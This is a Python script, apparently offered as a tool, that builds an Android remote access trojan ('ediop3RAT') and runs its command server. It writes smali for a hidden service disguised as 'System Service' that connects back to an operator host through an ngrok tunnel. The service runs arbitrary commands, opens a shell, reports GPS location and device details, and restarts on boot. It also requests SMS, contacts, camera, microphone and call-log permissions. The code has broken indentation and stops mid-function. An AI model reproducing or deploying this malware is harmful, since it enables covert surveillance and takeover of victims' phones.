#!/usr/bin/env python3
import os
import sys
import socket
import threading
import argparse
import subprocess
import time
import json
import base64
import pyngrok.ngrok
from zipfile import ZipFile
from datetime import datetime
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

KEY = b'secretkey1234567'
IV = b'initialvec123456'
NGROK_AUTH_TOKEN = ""
APKTOOL_PATH = "apktool.jar"
JARSIGNER_PATH = "jarsigner"
KEYSTORE_PATH = "debug.keystore"
KEYSTORE_PASS = "android"
KEYSTORE_ALIAS = "androiddebugkey"

class AndroidRAT:
    def __init__(self):
        self.sessions = {}
        self.current_session = None
        self.running = True
        self.ngrok_tunnel = None
        
    def encrypt(self, data):
        cipher = AES.new(KEY, AES.MODE_CBC, IV)
        padded_data = pad(data.encode(), AES.block_size)
        return base64.b64encode(cipher.encrypt(padded_data)).decode()
    
    def decrypt(self, encrypted_data):
        cipher = AES.new(KEY, AES.MODE_CBC, IV)
        decrypted = cipher.decrypt(base64.b64decode(encrypted_data))
        return unpad(decrypted, AES.block_size).decode()
    
    def build_apk(self, ip, port, output="karma.apk", visible_icon=False):
        try:
            os.makedirs("payload/assets", exist_ok=True)
            os.makedirs("payload/res", exist_ok=True)
            os.makedirs("payload/smali/com/ediop3rat", exist_ok=True)
            
            main_activity = f"""
.class public Lcom/ediop3rat/MainActivity;
.super Landroid/app/Service;
.source "MainActivity.java"

.field private static final TAG:Ljava/lang/String; = "ediop3RAT"

.field private mSocket:Ljava/net/Socket;
.field private mIP:Ljava/lang/String;
.field private mPort:I
.field private mThread:Ljava/lang/Thread;

.method public constructor <init>()V
    .locals 1

    .prologue
    .line 15
    invoke-direct {{p0}}, Landroid/app/Service;-><init>()V

    .line 19
    const-string v0, "{ip}"

    iput-object v0, p0, Lcom/ediop3rat/MainActivity;->mIP:Ljava/lang/String;

    .line 20
    const/16 v0, {port}

    iput v0, p0, Lcom/ediop3rat/MainActivity;->mPort:I

    return-void
.end method

.method static synthetic access$000(Lcom/ediop3rat/MainActivity;)Ljava/net/Socket;
    .locals 1
    .param p0, "x0"    # Lcom/ediop3rat/MainActivity;

    .prologue
    .line 15
    iget-object v0, p0, Lcom/ediop3rat/MainActivity;->mSocket:Ljava/net/Socket;

    return-object v0
.end method

.method static synthetic access$100(Lcom/ediop3rat/MainActivity;)V
    .locals 0
    .param p0, "x0"    # Lcom/ediop3rat/MainActivity;

    .prologue
    .line 15
    invoke-direct {{p0}}, Lcom/ediop3rat/MainActivity;->handleConnection()V

    return-void
.end method

.method private handleConnection()V
    .locals 8

    .prologue
    .line 48
    :goto_0
    :try_start_0
    new-instance v1, Ljava/net/Socket;

    iget-object v2, p0, Lcom/ediop3rat/MainActivity;->mIP:Ljava/lang/String;

    iget v3, p0, Lcom/ediop3rat/MainActivity;->mPort:I

    invoke-direct {{v1, v2, v3}}, Ljava/net/Socket;-><init>(Ljava/lang/String;I)V

    iput-object v1, p0, Lcom/ediop3rat/MainActivity;->mSocket:Ljava/net/Socket;

    .line 49
    new-instance v1, Ljava/io/BufferedReader;

    new-instance v2, Ljava/io/InputStreamReader;

    iget-object v3, p0, Lcom/ediop3rat/MainActivity;->mSocket:Ljava/net/Socket;

    invoke-virtual {{v3}}, Ljava/net/Socket;->getInputStream()Ljava/io/InputStream;

    move-result-object v3

    invoke-direct {{v2, v3}}, Ljava/io/InputStreamReader;-><init>(Ljava/io/InputStream;)V

    invoke-direct {{v1, v2}}, Ljava/io/BufferedReader;-><init>(Ljava/io/Reader;)V

    .line 50
    .local v1, "in":Ljava/io/BufferedReader;
    new-instance v2, Ljava/io/PrintWriter;

    iget-object v3, p0, Lcom/ediop3rat/MainActivity;->mSocket:Ljava/net/Socket;

    invoke-virtual {{v3}}, Ljava/net/Socket;->getOutputStream()Ljava/io/OutputStream;

    move-result-object v3

    const/4 v4, 0x1

    invoke-direct {{v2, v3, v4}}, Ljava/io/PrintWriter;-><init>(Ljava/io/OutputStream;Z)V

    .line 52
    .local v2, "out":Ljava/io/PrintWriter;
    :goto_1
    invoke-virtual {{v1}}, Ljava/io/BufferedReader;->readLine()Ljava/lang/String;

    move-result-object v3

    .line 53
    .local v3, "command":Ljava/lang/String;
    if-nez v3, :cond_0

    .line 54
    iget-object v4, p0, Lcom/ediop3rat/MainActivity;->mSocket:Ljava/net/Socket;

    invoke-virtual {{v4}}, Ljava/net/Socket;->close()V

    .line 55
    goto :goto_0

    .line 58
    :cond_0
    const-string v4, "deviceInfo"

    invoke-virtual {{v3, v4}}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-eqz v4, :cond_1

    .line 59
    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {{v4}}, Ljava/lang/StringBuilder;-><init>()V

    const-string v5, "Manufacturer: "

    invoke-virtual {{v4, v5}}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    sget-object v5, Landroid/os/Build;->MANUFACTURER:Ljava/lang/String;

    invoke-virtual {{v4, v5}}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    const-string v5, "\\nModel: "

    invoke-virtual {{v4, v5}}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    sget-object v5, Landroid/os/Build;->MODEL:Ljava/lang/String;

    invoke-virtual {{v4, v5}}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    const-string v5, "\\nAndroid Version: "

    invoke-virtual {{v4, v5}}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    sget-object v5, Landroid/os/Build$VERSION;->RELEASE:Ljava/lang/String;

    invoke-virtual {{v4, v5}}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    const-string v5, "\\nSDK: "

    invoke-virtual {{v4, v5}}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    sget-object v5, Landroid/os/Build$VERSION;->SDK:Ljava/lang/String;

    invoke-virtual {{v4, v5}}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {{v4}}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {{v2, v4}}, Ljava/io/PrintWriter;->println(Ljava/lang/String;)V

    goto :goto_1

    .line 62
    :cond_1
    const-string v4, "getIP"

    invoke-virtual {{v3, v4}}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-eqz v4, :cond_2

    .line 63
    invoke-static {{p0}}, Lcom/ediop3rat/MainActivity;->getIPAddress(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {{v2, v4}}, Ljava/io/PrintWriter;->println(Ljava/lang/String;)V

    goto :goto_1

    .line 66
    :cond_2
    const-string v4, "getLocation"

    invoke-virtual {{v3, v4}}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-eqz v4, :cond_3

    .line 67
    invoke-direct {{p0}}, Lcom/ediop3rat/MainActivity;->getLocation()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {{v2, v4}}, Ljava/io/PrintWriter;->println(Ljava/lang/String;)V

    goto :goto_1

    .line 70
    :cond_3
    const-string v4, "shell"

    invoke-virtual {{v3, v4}}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-eqz v4, :cond_4

    .line 71
    invoke-direct {{p0}}, Lcom/ediop3rat/MainActivity;->executeShell()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {{v2, v4}}, Ljava/io/PrintWriter;->println(Ljava/lang/String;)V

    goto :goto_1

    .line 74
    :cond_4
    const-string v4, "exit"

    invoke-virtual {{v3, v4}}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-eqz v4, :cond_5

    .line 75
    iget-object v4, p0, Lcom/ediop3rat/MainActivity;->mSocket:Ljava/net/Socket;

    invoke-virtual {{v4}}, Ljava/net/Socket;->close()V

    .line 76
    return-void

    .line 79
    :cond_5
    invoke-direct {{p0, v3}}, Lcom/ediop3rat/MainActivity;->executeCommand(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {{v2, v4}}, Ljava/io/PrintWriter;->println(Ljava/lang/String;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto/16 :goto_1

    .line 82
    .end local v1    # "in":Ljava/io/BufferedReader;
    .end local v2    # "out":Ljava/io/PrintWriter;
    .end local v3    # "command":Ljava/lang/String;
    :catch_0
    move-exception v1

    .line 83
    .local v1, "e":Ljava/lang/Exception;
    const-wide/16 v2, 0x1388

    :try_start_1
    invoke-static {{v2, v3}}, Ljava/lang/Thread;->sleep(J)V
    :try_end_1
    .catch Ljava/lang/InterruptedException; {:try_start_1 .. :try_end_1} :catch_1

    .line 86
    :goto_2
    goto/16 :goto_0

    .line 84
    :catch_1
    move-exception v2

    .line 85
    .local v2, "e1":Ljava/lang/InterruptedException;
    invoke-virtual {{v2}}, Ljava/lang/InterruptedException;->printStackTrace()V

    goto :goto_2
.end method

.method private executeCommand(Ljava/lang/String;)Ljava/lang/String;
    .locals 5
    .param p1, "command"    # Ljava/lang/String;

    .prologue
    .line 90
    :try_start_0
    invoke-static {}, Ljava/lang/Runtime;->getRuntime()Ljava/lang/Runtime;

    move-result-object v2

    invoke-virtual {{v2, p1}}, Ljava/lang/Runtime;->exec(Ljava/lang/String;)Ljava/lang/Process;

    move-result-object v1

    .line 91
    .local v1, "process":Ljava/lang/Process;
    new-instance v2, Ljava/io/BufferedReader;

    new-instance v3, Ljava/io/InputStreamReader;

    invoke-virtual {{v1}}, Ljava/lang/Process;->getInputStream()Ljava/io/InputStream;

    move-result-object v4

    invoke-direct {{v3, v4}}, Ljava/io/InputStreamReader;-><init>(Ljava/io/InputStream;)V

    invoke-direct {{v2, v3}}, Ljava/io/BufferedReader;-><init>(Ljava/io/Reader;)V

    .line 92
    .local v2, "reader":Ljava/io/BufferedReader;
    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {{v3}}, Ljava/lang/StringBuilder;-><init>()V

    .line 93
    .local v3, "result":Ljava/lang/StringBuilder;
    :goto_0
    invoke-virtual {{v2}}, Ljava/io/BufferedReader;->readLine()Ljava/lang/String;

    move-result-object v0

    .local v0, "line":Ljava/lang/String;
    if-eqz v0, :cond_0

    .line 94
    invoke-virtual {{v3, v0}}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 95
    const-string v4, "\\n"

    invoke-virtual {{v3, v4}}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    .line 99
    .end local v0    # "line":Ljava/lang/String;
    .end local v1    # "process":Ljava/lang/Process;
    .end local v2    # "reader":Ljava/io/BufferedReader;
    .end local v3    # "result":Ljava/lang/StringBuilder;
    :catch_0
    move-exception v4

    .line 100
    .local v4, "e":Ljava/lang/Exception;
    invoke-virtual {{v4}}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v4

    .end local v4    # "e":Ljava/lang/Exception;
    :goto_1
    return-object v4

    .line 97
    .restart local v0    # "line":Ljava/lang/String;
    .restart local v1    # "process":Ljava/lang/Process;
    .restart local v2    # "reader":Ljava/io/BufferedReader;
    .restart local v3    # "result":Ljava/lang/StringBuilder;
    :cond_0
    :try_start_1
    invoke-virtual {{v3}}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    move-result-object v4

    goto :goto_1
.end method

.method private executeShell()Ljava/lang/String;
    .locals 5

    .prologue
    .line 104
    :try_start_0
    invoke-static {}, Ljava/lang/Runtime;->getRuntime()Ljava/lang/Runtime;

    move-result-object v2

    const-string v3, "sh"

    invoke-virtual {{v2, v3}}, Ljava/lang/Runtime;->exec(Ljava/lang/String;)Ljava/lang/Process;

    move-result-object v1

    .line 105
    .local v1, "process":Ljava/lang/Process;
    new-instance v2, Ljava/io/BufferedReader;

    new-instance v3, Ljava/io/InputStreamReader;

    invoke-virtual {{v1}}, Ljava/lang/Process;->getInputStream()Ljava/io/InputStream;

    move-result-object v4

    invoke-direct {{v3, v4}}, Ljava/io/InputStreamReader;-><init>(Ljava/io/InputStream;)V

    invoke-direct {{v2, v3}}, Ljava/io/BufferedReader;-><init>(Ljava/io/Reader;)V

    .line 106
    .local v2, "reader":Ljava/io/BufferedReader;
    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {{v3}}, Ljava/lang/StringBuilder;-><init>()V

    .line 107
    .local v3, "result":Ljava/lang/StringBuilder;
    :goto_0
    invoke-virtual {{v2}}, Ljava/io/BufferedReader;->readLine()Ljava/lang/String;

    move-result-object v0

    .local v0, "line":Ljava/lang/String;
    if-eqz v0, :cond_0

    .line 108
    invoke-virtual {{v3, v0}}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 109
    const-string v4, "\\n"

    invoke-virtual {{v3, v4}}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    .line 113
    .end local v0    # "line":Ljava/lang/String;
    .end local v1    # "process":Ljava/lang/Process;
    .end local v2    # "reader":Ljava/io/BufferedReader;
    .end local v3    # "result":Ljava/lang/StringBuilder;
    :catch_0
    move-exception v4

    .line 114
    .local v4, "e":Ljava/lang/Exception;
    invoke-virtual {{v4}}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v4

    .end local v4    # "e":Ljava/lang/Exception;
    :goto_1
    return-object v4

    .line 111
    .restart local v0    # "line":Ljava/lang/String;
    .restart local v1    # "process":Ljava/lang/Process;
    .restart local v2    # "reader":Ljava/io/BufferedReader;
    .restart local v3    # "result":Ljava/lang/StringBuilder;
    :cond_0
    :try_start_1
    invoke-virtual {{v3}}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    move-result-object v4

    goto :goto_1
.end method

.method private getLocation()Ljava/lang/String;
    .locals 10

    .prologue
    .line 118
    const-string v0, ""

    .line 120
    .local v0, "location":Ljava/lang/String;
    :try_start_0
    const-string v5, "location"

    invoke-virtual {{p0, v5}}, Lcom/ediop3rat/MainActivity;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v2

    check-cast v2, Landroid/location/LocationManager;

    .line 121
    .local v2, "lm":Landroid/location/LocationManager;
    const-string v5, "gps"

    invoke-virtual {{v2, v5}}, Landroid/location/LocationManager;->getLastKnownLocation(Ljava/lang/String;)Landroid/location/Location;

    move-result-object v1

    .line 122
    .local v1, "loc":Landroid/location/Location;
    if-eqz v1, :cond_0

    .line 123
    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {{v5}}, Ljava/lang/StringBuilder;-><init>()V

    const-string v6, "Latitude: "

    invoke-virtual {{v5, v6}}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {{v1}}, Landroid/location/Location;->getLatitude()D

    move-result-wide v6

    invoke-virtual {{v5, v6, v7}}, Ljava/lang/StringBuilder;->append(D)Ljava/lang/StringBuilder;

    move-result-object v5

    const-string v6, "\\nLongitude: "

    invoke-virtual {{v5, v6}}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {{v1}}, Landroid/location/Location;->getLongitude()D

    move-result-wide v6

    invoke-virtual {{v5, v6, v7}}, Ljava/lang/StringBuilder;->append(D)Ljava/lang/StringBuilder;

    move-result-object v5

    const-string v6, "\\nAltitude: "

    invoke-virtual {{v5, v6}}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {{v1}}, Landroid/location/Location;->getAltitude()D

    move-result-wide v6

    invoke-virtual {{v5, v6, v7}}, Ljava/lang/StringBuilder;->append(D)Ljava/lang/StringBuilder;

    move-result-object v5

    const-string v6, "\\nAccuracy: "

    invoke-virtual {{v5, v6}}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {{v1}}, Landroid/location/Location;->getAccuracy()F

    move-result v6

    invoke-virtual {{v5, v6}}, Ljava/lang/StringBuilder;->append(F)Ljava/lang/StringBuilder;

    move-result-object v5

    const-string v6, "\\nTime: "

    invoke-virtual {{v5, v6}}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {{v1}}, Landroid/location/Location;->getTime()J

    move-result-wide v6

    invoke-virtual {{v5, v6, v7}}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {{v5}}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    .line 131
    .end local v1    # "loc":Landroid/location/Location;
    .end local v2    # "lm":Landroid/location/LocationManager;
    :cond_0
    :goto_0
    return-object v0

    .line 128
    :catch_0
    move-exception v3

    .line 129
    .local v3, "e":Ljava/lang/Exception;
    invoke-virtual {{v3}}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    move-result-object v0

    goto :goto_0
.end method

.method public static getIPAddress(Landroid/content/Context;)Ljava/lang/String;
    .locals 6
    .param p0, "context"    # Landroid/content/Context;

    .prologue
    .line 135
    const-string v1, ""

    .line 137
    .local v1, "ip":Ljava/lang/String;
    :try_start_0
    const-string v4, "wifi"

    invoke-virtual {{p0, v4}}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v3

    check-cast v3, Landroid/net/wifi/WifiManager;

    .line 138
    .local v3, "wm":Landroid/net/wifi/WifiManager;
    invoke-virtual {{v3}}, Landroid/net/wifi/WifiManager;->getConnectionInfo()Landroid/net/wifi/WifiInfo;

    move-result-object v2

    .line 139
    .local v2, "wi":Landroid/net/wifi/WifiInfo;
    invoke-virtual {{v2}}, Landroid/net/wifi/WifiInfo;->getIpAddress()I

    move-result v4

    invoke-static {{v4}}, Landroid/text/format/Formatter;->formatIpAddress(I)Ljava/lang/String;

    move-result-object v1

    .line 140
    const-string v4, "0.0.0.0"

    invoke-virtual {{v1, v4}}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-eqz v4, :cond_0

    .line 141
    const-string v4, "connectivity"

    invoke-virtual {{p0, v4}}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/net/ConnectivityManager;

    .line 142
    .local v0, "cm":Landroid/net/ConnectivityManager;
    const/4 v4, 0x1

    invoke-virtual {{v0, v4}}, Landroid/net/ConnectivityManager;->getNetworkInfo(I)Landroid/net/NetworkInfo;

    move-result-object v4

    invoke-virtual {{v4}}, Landroid/net/NetworkInfo;->isConnected()Z

    move-result v4

    if-eqz v4, :cond_0

    .line 143
    invoke-static {}, Ljava/net/NetworkInterface;->getNetworkInterfaces()Ljava/util/Enumeration;

    move-result-object v4

    invoke-static {{v4}}, Ljava/util/Collections;->list(Ljava/util/Enumeration;)Ljava/util/ArrayList;

    move-result-object v4

    invoke-virtual {{v4}}, Ljava/util/ArrayList;->iterator()Ljava/util/Iterator;

    move-result-object v4

    :goto_0
    invoke-interface {{v4}}, Ljava/util/Iterator;->hasNext()Z

    move-result v5

    if-eqz v5, :cond_0

    invoke-interface {{v4}}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v5

    check-cast v5, Ljava/net/NetworkInterface;

    .line 144
    .local v5, "intf":Ljava/net/NetworkInterface;
    invoke-virtual {{v5}}, Ljava/net/NetworkInterface;->getInetAddresses()Ljava/util/Enumeration;

    move-result-object v5

    .end local v5    # "intf":Ljava/net/NetworkInterface;
    invoke-static {{v5}}, Ljava/util/Collections;->list(Ljava/util/Enumeration;)Ljava/util/ArrayList;

    move-result-object v5

    invoke-virtual {{v5}}, Ljava/util/ArrayList;->iterator()Ljava/util/Iterator;

    move-result-object v5

    :goto_1
    invoke-interface {{v5}}, Ljava/util/Iterator;->hasNext()Z

    move-result v5

    if-eqz v5, :cond_0

    .line 145
    invoke-interface {{v5}}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v5

    check-cast v5, Ljava/net/InetAddress;

    .line 146
    .local v5, "addr":Ljava/net/InetAddress;
    invoke-virtual {{v5}}, Ljava/net/InetAddress;->isLoopbackAddress()Z

    move-result v5

    .end local v5    # "addr":Ljava/net/InetAddress;
    if-nez v5, :cond_0

    .line 147
    invoke-virtual {{v5}}, Ljava/net/InetAddress;->getHostAddress()Ljava/lang/String;

    move-result-object v1

    .line 148
    const/16 v5, 0x3a

    invoke-virtual {{v1, v5}}, Ljava/lang/String;->indexOf(I)I

    move-result v5

    if-gez v5, :cond_0

    .line 149
    invoke-virtual {{v5}}, Ljava/net/InetAddress;->getHostAddress()Ljava/lang/String;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    move-result-object v1

    goto :goto_1

    .line 158
    .end local v0    # "cm":Landroid/net/ConnectivityManager;
    .end local v2    # "wi":Landroid/net/wifi/WifiInfo;
    .end local v3    # "wm":Landroid/net/wifi/WifiManager;
    :catch_0
    move-exception v4

    .line 159
    .local v4, "e":Ljava/lang/Exception;
    invoke-virtual {{v4}}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v1

    .line 161
    .end local v4    # "e":Ljava/lang/Exception;
    :cond_0
    return-object v1
.end method

# virtual methods
.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 1
    .param p1, "intent"    # Landroid/content/Intent;

    .prologue
    .line 165
    const/4 v0, 0x0

    return-object v0
.end method

.method public onCreate()V
    .locals 3

    .prologue
    .line 169
    invoke-super {{p0}}, Landroid/app/Service;->onCreate()V

    .line 170
    new-instance v0, Ljava/lang/Thread;

    new-instance v1, Lcom/ediop3rat/MainActivity$1;

    invoke-direct {{v1, p0}}, Lcom/ediop3rat/MainActivity$1;-><init>(Lcom/ediop3rat/MainActivity;)V

    invoke-direct {{v0, v1}}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    iput-object v0, p0, Lcom/ediop3rat/MainActivity;->mThread:Ljava/lang/Thread;

    .line 176
    iget-object v0, p0, Lcom/ediop3rat/MainActivity;->mThread:Ljava/lang/Thread;

    invoke-virtual {{v0}}, Ljava/lang/Thread;->start()V

    .line 177
    return-void
.end method

.method public onDestroy()V
    .locals 1

    .prologue
    .line 181
    invoke-super {{p0}}, Landroid/app/Service;->onDestroy()V

    .line 182
    :try_start_0
    iget-object v0, p0, Lcom/ediop3rat/MainActivity;->mSocket:Ljava/net/Socket;

    if-eqz v0, :cond_0

    .line 183
    iget-object v0, p0, Lcom/ediop3rat/MainActivity;->mSocket:Ljava/net/Socket;

    invoke-virtual {{v0}}, Ljava/net/Socket;->close()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 187
    :cond_0
    :goto_0
    return-void

    .line 185
    :catch_0
    move-exception v0

    goto :goto_0
.end method

.method public onStartCommand(Landroid/content/Intent;II)I
    .locals 1
    .param p1, "intent"    # Landroid/content/Intent;
    .param p2, "flags"    # I
    .param p3, "startId"    # I

    .prologue
    .line 191
    const/4 v0, 0x1

    return v0
.end method
"""
            with open("payload/smali/com/ediop3rat/MainActivity.smali", "w") as f:
                f.write(main_activity)
                
manifest = """<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.ediop3rat"
    android:versionCode="1"
    android:versionName="1.0" >
    
    <uses-sdk android:minSdkVersion="14" />
    
<!-- ===== FULL PERMISSIONS FOR COMPLETE ACCESS ===== -->
<uses-permission android:name="android.permission.INTERNET" />
<uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
<uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
<uses-permission android:name="android.permission.CHANGE_WIFI_STATE" />
<uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
<uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
<uses-permission android:name="android.permission.WAKE_LOCK" />
<uses-permission android:name="android.permission.DISABLE_KEYGUARD" />
<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
<uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
<uses-permission android:name="android.permission.READ_PHONE_STATE" />
<uses-permission android:name="android.permission.CAMERA" />
<uses-permission android:name="android.permission.RECORD_AUDIO" />
<uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
<uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
<uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION" />
<uses-permission android:name="android.permission.READ_SMS" />
<uses-permission android:name="android.permission.SEND_SMS" />
<uses-permission android:name="android.permission.RECEIVE_SMS" />
<uses-permission android:name="android.permission.READ_CALL_LOG" />
<uses-permission android:name="android.permission.CALL_PHONE" />
<uses-permission android:name="android.permission.READ_CONTACTS" />
<uses-permission android:name="android.permission.WRITE_CONTACTS" />
<uses-permission android:name="android.permission.VIBRATE" />
<uses-permission android:name="android.permission.READ_CLIPBOARD" />
<uses-permission android:name="android.permission.PACKAGE_USAGE_STATS" tools:ignore="ProtectedPermissions" />
<uses-permission android:name="android.permission.BIND_ACCESSIBILITY_SERVICE" />
<uses-permission android:name="android.permission.REQUEST_INSTALL_PACKAGES" />
<!-- ===== END PERMISSIONS ===== -->
    
    <application
        android:icon="@drawable/ic_launcher"
        android:label="System Service" >
        <service
            android:name=".MainActivity"
            android:enabled="true"
            android:exported="true" >
            <!--
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
            </intent-filter>
            -->
        </service>
        
        <receiver android:name=".BootReceiver" >
            <intent-filter>
                <action android:name="android.intent.action.BOOT_COMPLETED" />
            </intent-filter>
        </receiver>
    </application>
</manifest>"""
with open("payload/AndroidManifest.xml", "w") as f:
    f.write(manifest)
                
            boot_receiver = """.class public Lcom/ediop3rat/BootReceiver;
.super Landroid/content/BroadcastReceiver;
.source "BootReceiver.java"


# direct methods
.method public constructor <init>()V
    .locals 0

    .prologue
    .line 8
    invoke-direct {{p0}}, Landroid/content/BroadcastReceiver;-><init>()V

    return-void
.end method


# virtual methods
.method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 2
    .param p1, "context"    # Landroid/content/Context;
    .param p2, "intent"    # Landroid/content/Intent;

    .prologue
    .line 12
    new-instance v0, Landroid/content/Intent;

    const-class v1, Lcom/ediop3rat/MainActivity;

    invoke-direct {{v0, p1, v1}}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 13
    .local v0, "serviceIntent":Landroid/content/Intent;
    invoke-virtual {{p1, v0}}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    .line 14
    return-void
.end method
"""
            with open("payload/smali/com/ediop3rat/BootReceiver.smali", "w") as f:
                f.write(boot_receiver)
                
            subprocess.run(["java", "-jar", APKTOOL_PATH, "b", "payload", "-o", "unsigned.apk"], check=True)
            
            subprocess.run([
                JARSIGNER_PATH,
                "-verbose",
                "-sigalg", "SHA1withRSA",
                "-digestalg", "SHA1",
                "-keystore", KEYSTORE_PATH,
                "-storepass", KEYSTORE_PASS,
                "-keypass", KEYSTORE_PASS,
                "unsigned.apk",
                KEYSTORE_ALIAS
            ], check=True)
            
            subprocess.run(["zipalign", "-v", "4", "unsigned.apk", output], check=True)
            
            os.remove("unsigned.apk")
            
            print(f"[+] APK built successfully: {output}")
            return True
            
        except Exception as e:
            print(f"[-] Error building APK: {str(e)}")
            return False
    
    def start_ngrok(self, port):
        try:
            if not NGROK_AUTH_TOKEN:
                print("[-] Ngrok auth token not configured")
                return None
                
            pyngrok.ngrok.set_auth_token(NGROK_AUTH_TOKEN)
            self.ngrok_tunnel = pyngrok.ngrok.connect(port, "tcp")
            print(f"[+] Ngrok tunnel created: {self.ngrok_tunnel.public_url}")
            return self.ngrok_tunnel.public_url
        except Exception as e:
            print(f"[-] Error creating ngrok tunnel: {str(e)}")
            return None
    
    def stop_ngrok(self):
        if self.ngrok_tunnel:
            try:
                pyngrok.ngrok.disconnect(self.ngrok_tunnel.public_url)
                print("[+] Ngrok tunnel stopped")
            except Exception as e:
                print(f"[-] Error stopping ngrok tunnel: {str(e)}")
    
    def handle_client(self, client_socket, address):
        session_id = f"{address[0]}:{address[1]}"
        self.sessions[session_id] = client_socket
        self.current_session = session_id
        
        print(f"[+] New session: {session_id}")
        
        try:
            while self.running:
                client_socket.send(b"ediop3RAT> ")
                data = client_socket.recv(1024).decode().strip()
                
                if not data:
                    break
                    
                if data == "exit":
                    break
                    
                response = self.process_command(data)
                client_socket.send(response.encode())
                
        except Exception as e:
            print(f"[-] Error in session {session_id}: {str(e)}")
            
        finally:
            client_socket.close()
            del self.sessions[session_id]
            print(f"[-] Session closed: {session_id}")
    
    def process_command(self, command):
        try:
